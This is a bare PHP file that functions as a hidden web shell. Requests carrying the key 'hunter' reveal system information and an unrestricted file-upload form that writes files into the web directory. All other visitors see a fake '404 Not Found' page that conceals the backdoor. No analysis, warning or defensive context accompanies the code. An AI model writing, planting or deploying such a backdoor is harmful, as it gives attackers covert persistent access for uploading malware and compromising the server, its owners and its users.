<?php 
error_reporting(E_ERROR | E_PARSE);
if ($_GET["key"] == "hunter"){
    echo "<b>hunter</b><br>";
    echo '<b>System Info:</b> '.php_uname();
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if( $_POST['_upl'] == "Upload" ) {
        if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo '<b>Successfully!</b><br><br>'; 
        } else { 
            echo 'Failed!</b><br><br>'; 
        }
    }
} else {
    $domain = $_SERVER['SERVER_NAME'];
    echo'<html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    </body></html>';
}
?>
